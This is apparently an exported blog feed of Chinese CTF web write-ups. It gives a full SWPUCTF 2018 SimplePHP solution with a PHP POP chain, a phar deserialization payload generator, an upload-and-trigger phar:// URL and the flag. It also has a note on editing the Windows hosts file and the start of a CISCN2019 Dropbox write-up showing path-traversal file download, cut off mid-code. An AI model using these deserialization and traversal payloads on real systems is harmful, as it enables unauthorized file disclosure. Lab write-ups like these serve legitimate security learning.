&quot;flag&#123;d6dc84d3-690e-44ab-b3e2-a03940959b5d&#125;&quot;;unset($rea1_f1114g);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2018-SimplePHP</title>
      <link href="2020/10/23/SWPUCTF-2018-SimplePHP/"/>
      <url>2020/10/23/SWPUCTF-2018-SimplePHP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="拿下代码"><a href="#拿下代码" class="headerlink" title="拿下代码"></a>拿下代码</h2><p>先通过查看文件的功能拿下全部的文件代码，分别是<code>index.php</code>、<code>base.php</code>、<code>file.php</code>、<code>upload_file.php</code>、<code>function.php</code>、<code>class.php</code>。然后粗略看下代码，有个提示（不知道是不是后面放上去的），就是<code>class.php</code>那里。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str &#x3D; $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test &#x3D; $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key &#x3D; $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params &#x3D; array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value &#x3D; $this-&gt;params[$key];        &#125; else &#123;            $value &#x3D; &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text &#x3D; base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="审计与pop链的构造"><a href="#审计与pop链的构造" class="headerlink" title="审计与pop链的构造"></a>审计与pop链的构造</h2><p>首先是<code>C1e4r</code>类的<code>__destruct()</code>方法，可以把<code>$test</code>也就是<code>$str</code>给输出出来。想要输出flag就得将<code>$str</code>的内容为flag文件，将<code>$str</code>声明为<code>$show</code>对象可以触发<code>show</code>类中的<code>__toString()</code>方法。</p><p>然后是<code>show</code>类的<code>__toString()</code>方法，可以把<code>$content</code>的内容返回对象，这就要求<code>$show-&gt;str[&#39;str&#39;]-&gt;source</code>的内容为flag文件，若<code>$show-&gt;str[&#39;str&#39;]</code>为test类的一个实例化对象，则因<code>test</code>类里面没有<code>source</code>属性，从而触发<code>__get()</code>方法。</p><p>最后就是<code>test</code>类了，利用<code>__get()</code>到<code>get()</code>到<code>file_get($value)</code>到最后返回出来，$value的值为<code>$this-&gt;params[$key]</code>，</p><p>下为pop链函数<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r &#x3D; new C1e4r();$show &#x3D; new Show();$test &#x3D; new Test();$test-&gt;params[&#39;source&#39;] &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&quot;;  &#x2F;&#x2F;目标文件$c1e4r-&gt;str &#x3D; $show;   &#x2F;&#x2F;触发__toString()，利用 &#96;$this-&gt;test &#x3D; $this-&gt;str; echo $this-&gt;test;&#96;$show-&gt;str[&#39;str&#39;] &#x3D; $test;  &#x2F;&#x2F;触发__get()，利用 &#96;$this-&gt;str[&#39;str&#39;]-&gt;source&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>第一个<code>__tostring()</code>的触发是因为对象被当做字符串了，第二个<code>__get()</code>方法触发是因为<code>test</code>类里面没有<code>source</code>属性。</p><h2 id="phar文件制作及利用"><a href="#phar文件制作及利用" class="headerlink" title="phar文件制作及利用"></a>phar文件制作及利用</h2><p>phar文件制作脚本:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r &#x3D; new C1e4r();$show &#x3D; new Show();$test &#x3D; new Test();$test-&gt;params[&#39;source&#39;] &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&quot;;  &#x2F;&#x2F;目标文件$c1e4r-&gt;str &#x3D; $show;   &#x2F;&#x2F;触发__toString()，利用 &#96;$this-&gt;test &#x3D; $this-&gt;str; echo $this-&gt;test;&#96;$show-&gt;str[&#39;str&#39;] &#x3D; $test;  &#x2F;&#x2F;触发__get()，利用 &#96;$this-&gt;str[&#39;str&#39;]-&gt;source&#96;;$phar &#x3D; new Phar(&quot;7.phar&quot;); &#x2F;&#x2F;生成phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);$phar-&gt;setMetadata($c1e4r); &#x2F;&#x2F;触发头是C1e4r类$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;生成签名$phar-&gt;stopBuffering();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地访问一下生成文件后改下后缀名为<code>.png</code>，上传。上传之后可以在<code>upload</code>目录下发现刚上传的图片，在<code>function.php</code>的源码里面可以发现下面的这条语句<br><pre class="line-numbers language-none"><code class="language-none">if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123;         unlink($filename);     &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>从而得知文件的目录。。。阿巴阿巴，目录直接就开着呢，就比较好找。</p><h2 id="触发phar-获得flag"><a href="#触发phar-获得flag" class="headerlink" title="触发phar://获得flag"></a>触发phar://获得flag</h2><p>访问格式如下<br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;b96da071-0c04-4abe-96c6-ea5cf235782d.node3.buuoj.cn&#x2F;file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;2fe9104ed353a3e60ed55404e1abf179.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/10/23/SWPUCTF-2018-SimplePHP/1.png" alt><br>获得base64转化后的内容解码一下即为flag。<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>PD9waHAgDQoJLy8kYSA9ICdmbGFnezBlNjg3NzQzLWM5NWQtNDJhMi04Nzk5LWM0MzIwNjU1MjBjMH0nOw0KID8+DQoNCg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">&lt;?php &#x2F;&#x2F;$a &#x3D; &#39;flag&#123;0e687743-c95d-42a2-8799-c432065520c0&#125;&#39;; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决访问不了github的问题</title>
      <link href="2020/10/23/%E8%A7%A3%E5%86%B3%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86github%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>2020/10/23/%E8%A7%A3%E5%86%B3%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86github%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在又一次访问不了github之后，我终于想起来了修一下电脑的某些文件。百度到了问题的解决方案如下<a href="https://blog.csdn.net/whbk101/article/details/102703671">链接</a>所示.</p><h2 id="二次总结"><a href="#二次总结" class="headerlink" title="二次总结"></a>二次总结</h2><p>为防止意外，二次总结一下</p><h3 id="改host文件内容"><a href="#改host文件内容" class="headerlink" title="改host文件内容"></a>改host文件内容</h3><p>是<code>C:\Windows\System32\Drivers\etc</code>目录下的<code>host</code>文件需要修改。原来可能是空的（反正我原来是空的），直接改为以下格式<br><pre class="line-numbers language-none"><code class="language-none">#github192.30.253.112 github.com  151.101.113.194 github.global.ssl.fastly.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>然后上面的两个ip地址分别为<br><a href="http://github.com.ipaddress.com/">http://github.com.ipaddress.com/</a></p><p><a href="http://github.global.ssl.fastly.net.ipaddress.com/">http://github.global.ssl.fastly.net.ipaddress.com/</a></p><p>然后就可以正常访问了!<br><img src="/2020/10/23/%E8%A7%A3%E5%86%B3%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86github%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 电脑问题 </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019_华北赛区_Day1_Web1-Dropbox</title>
      <link href="2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/"/>
      <url>2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="好长时间没做web了，web狗太难了"><a href="#好长时间没做web了，web狗太难了" class="headerlink" title="好长时间没做web了，web狗太难了"></a>好长时间没做web了，web狗太难了</h2><p>首先得检讨一下，我竟然将近三天没做web题目了，这这这还是一个web狗应该做的吗？反思一下呜呜呜。。。</p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>什么是phar反序列化呢？</p><p>下面的文章可能会有点帮助<a href="https://www.jianshu.com/p/0cfc98f72e52">来自jianshu</a></p><p>按照我的理解来说呢，就是把危险的文件上传到服务器？然后借助某些功能与危险函数实现危险的操作，太笼统了。具体来说呢就是php文件系统中<code>很大一部分的函数</code>在通过<code>phar://</code>解析时，存在着对<code>meta-data</code>（在这里<code>&lt;meta-data&gt;区域</code>面搞反序列化的pop链）反序列化的操作。</p><h2 id="具体实现的实例如下所示"><a href="#具体实现的实例如下所示" class="headerlink" title="具体实现的实例如下所示"></a>具体实现的实例如下所示</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/**上面的这里写pop链*/</span><span class="token comment">/**下面的东西一般是不变的*/</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"7.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;?php__HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$exception</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//set-metadata参数会变</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="回归正题，题解如下"><a href="#回归正题，题解如下" class="headerlink" title="回归正题，题解如下"></a>回归正题，题解如下</h2><p>下午好，web狗。<br>终于清理掉这个老顽固了。<img src="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/1.png" alt="哈哈"></p><p>先分析源代码找出pop链，代码怎么找？</p><h2 id="0x01-任意文件下载"><a href="#0x01-任意文件下载" class="headerlink" title="0x01 任意文件下载"></a>0x01 任意文件下载</h2><p>注册登录后，有个上传文件的地方，上传过图片后可以删除或者下载，然后就想着可能是文件上传漏洞，开始我还以为要上传图片马。。</p><p>这里的这个任意文件下载-&gt;先用burp抓包，修改其中的filename字段就可以了，改为../../index.php下载主页代码。其他代码类似也能下载，这信息收集真的难顶，收集能收集10分钟，我丢。</p><p>利用的类都在class.php文件里面，下面是class文件的内容<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token 